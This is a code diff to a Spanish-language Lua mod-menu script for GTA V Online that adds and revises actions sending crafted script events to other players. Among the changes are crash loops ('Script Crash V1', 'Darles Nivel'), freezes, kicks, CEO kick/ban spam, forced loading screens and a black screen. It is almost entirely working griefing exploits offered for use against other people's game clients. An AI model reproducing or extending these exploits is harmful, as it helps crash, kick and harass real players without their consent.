@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Bienvenidx " .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. " Al Script!!")
 util.toast("Cargando, espere... (1-2s)")
 local response = false
-local localVer = 3.872
+local localVer = 3.873
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -614,37 +614,37 @@ players.on_join(function(player_id)
 
     local inf_loading = menu.list(trolling, "Pantalla de carga infinita", {}, "")
     menu.action(inf_loading, "Teleport a MC", {}, "", function()
-        util.trigger_script_event(1 << player_id, {0xDEE5ED91, player_id, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        util.trigger_script_event(1 << player_id, {879177392, player_id, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})    
     end)
 
     menu.action(inf_loading, "Metodo Apartamento", {}, "", function()
-        util.trigger_script_event(1 << player_id, {0x7EFC3716, player_id, 0, 1, id})
+        util.trigger_script_event(434937615, player_id, 0, 1)
     end)
         
     menu.action_slider(inf_loading, "Telefono corrupto", {}, "Click para seleccionar un estilo", invites, function(index, name)
         switch name do
             case 1:
-                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x1})
+                util.trigger_script_event(1 << player_id, {-1891171016, pid, 1})
                 util.toast("Invitacion a yate")
             break
             case 2:
-                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x2})
+                util.trigger_script_event(1 << player_id, {-1891171016, pid, 2})
                 util.toast("Invitacion a oficina")
             break
             case 3:
-                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x3})
+                util.trigger_script_event(1 << player_id, {-1891171016, pid, 3})
                 util.toast("Invitacion al club")
             break
             case 4:
-                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x4})
+                util.trigger_script_event(1 << player_id, {-1891171016, pid, 4})
                 util.toast("Invitacion al garage de oficina")
             break
             case 5:
-                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x5})
+                util.trigger_script_event(1 << player_id, {-1891171016, pid, 5})
                 util.toast("Invitacion a los santos cs")
             break
             case 6:
-                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x6})
+                util.trigger_script_event(1 << player_id, {-1891171016, pid, 6})
                 util.toast("Invitacion a apartamento")
             break
         end
@@ -652,6 +652,16 @@ players.on_join(function(player_id)
 
 
     local freeze = menu.list(malicious, "Metodos Frezeo", {}, "")
+
+    player_toggle_loop(freeze, player_id, "Potente", {}, "", function()
+        util.trigger_script_event(1 << player_id, {-93722397, pid, 0, 0, 0, 0, 0})
+        util.yield(500)
+    end)
+    
+    player_toggle_loop(freeze, player_id, "Freeze V1", {}, "", function()
+        util.trigger_script_event(1 << player_id, {434937615, pid, 0, 1, 0, 0})
+        util.yield(500)
+    end)
 
     player_toggle_loop(freeze, player_id, "Freeze Temporal", {}, "", function()
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
@@ -1348,6 +1358,22 @@ players.on_join(function(player_id)
 
     local netc = menu.list(twotake, "Crasheos De Red", {}, "")
 
+    local scrcrash = menu.list(twotake, "Script Crashes", {}, "")
+
+    menu.action(scrcrash, "Script Crash V1", {"crashv6"}, "", function()
+        for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 0, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 1, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 10, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 6, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 4, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 9, i, 1, 1, 1})
+        end
+    
+    end)
+
     -- Skidded from keramist.
 
     menu.action(netc, "Crasheo de red V1", {"crashv13"}, "", function(on_toggle)
@@ -1721,23 +1747,23 @@ players.on_join(function(player_id)
 
     if menu.get_edition() >= 2 then 
         menu.action(kicks, "Kickeo Adaptivo", {}, "", function()
-            util.trigger_script_event(1 << player_id, {915462795, 1, 0, 2, player_id, 2700359414448})
+            util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
             util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
-            util.trigger_script_event(1 << player_id, {243072129, 1, 0, 2, math.random(13, 257), 3, 1})
+            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
             menu.trigger_commands("breakup" .. players.get_name(player_id))
         end)
     else
         menu.action(kicks, "Kickeo adaptivo V2", {}, "", function()
-            util.trigger_script_event(1 << player_id, {915462795, 1, 0, 2, player_id, 2700359414448})
+            util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
             util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
-            util.trigger_script_event(1 << player_id, {243072129, 1, 0, 2, math.random(13, 257), 3, 1})
+            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
         end)
     end
 
     local sekicks = menu.list(kicks, "Kickeos Por Scripts", {}, "")
 
     menu.action(sekicks, "Script kick v1", {}, "Inbloqueable por stand.", function()
-        util.trigger_script_event(1 << player_id, {243072129, 1, 0, 2, math.random(13, 257), 3, 1})
+        util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
     end)
 
     menu.action(sekicks, "Script kick v2", {}, "", function()
@@ -1745,7 +1771,7 @@ players.on_join(function(player_id)
     end)
 
     menu.action(sekicks, "Script kick v3", {}, "", function()
-        util.trigger_script_event(1 << player_id, {915462795, 1, 0, 2, player_id, 2700359414448})
+        util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
     end)
 
     menu.action(kicks, "Desync Kick", {}, "", function()
@@ -1872,6 +1898,11 @@ players.on_join(function(player_id)
     --        util.toast(players.get_name(player_id).. " No esta en un coche")
     --    end
     --end)
+
+    menu.action(trolling, "Pantalla Negra", {}, "", function()
+        util.trigger_script_event(1 << player_id, {879177392, player_id, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        util.yield(1000)
+    end)
 
     menu.action(trolling, "Enviar Al Bote", {}, "", function()
         local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
@@ -2252,6 +2283,26 @@ players.on_join(function(player_id)
         util.toast("Es broma, que esperabas?")
     end)
 
+    menu.action(friendly, "Darles Nivel", {}, "Les subira el nivel de gta. \nPosible crash.", function()
+        util.trigger_script_event(1 << player_id, {697566862, player_id, 5, 0, 1, 1, 1})
+        for i = 0, 9 do
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 0, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 1, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 10, i, 1, 1, 1})
+        end
+        for i = 0, 1 do
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 6, i, 1, 1, 1})
+        end
+        for i = 0, 19 do
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 4, i, 1, 1, 1})
+        end
+        for i = 0, 99 do
+            util.trigger_script_event(1 << player_id, {697566862, player_id, 9, i, 1, 1, 1})
+            util.yield()
+        end
+    end)
 
     menu.toggle_loop(friendly, "Dar godmode silensioso", {}, "No lo detectaran mod menus gratuitos", function()
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
@@ -2389,19 +2440,19 @@ players.on_join(function(player_id)
 
     menu.action(sevents, "Cayo Op 'Test'", {}, "Intentara varios metodos a enviar a cayo. \nSi no tiene menu muy bueno funcionara. \nHay posibilidad que funcione con Stand.", function()
         for i = 1, 200 do
-            util.trigger_script_event(1 << player_id, {-910497748, 1, 0})
+            util.trigger_script_event(1 << player_id, {-910497748, player_id, 1, 0})
         end
     end)
 
     menu.action(sevents, "CEO Kick 'Test'", {}, "Intentara varios metodos para kickearlo de CEO.", function()
         for i = 1, 200 do
-            util.trigger_script_event(1 << player_id, {-1831959078, 1, 0, 2, 0, 3, 5})
+            util.trigger_script_event(1 << player_id, {-1831959078, player_id, 1, 0, 2, 0, 3, 5})
         end
     end)
 
     menu.action(sevents, "CEO Ban 'Test'", {}, "Intentara varios metodos para banearlo de CEO.", function()
         for i = 1, 200 do
-            util.trigger_script_event(1 << player_id, {316066012, 1, 0, 2, 1})
+            util.trigger_script_event(1 << player_id, {316066012, player_id, 1, 0, 2, 1})
         end
     end)
 
@@ -2736,6 +2787,12 @@ end)
 
 menu.toggle_loop(online, "Sin animacion", {}, "Cambias de arma rapido.", function()
     if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
+        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
+    end
+    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
+        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
+    end
+    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
         PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
     end
 end)
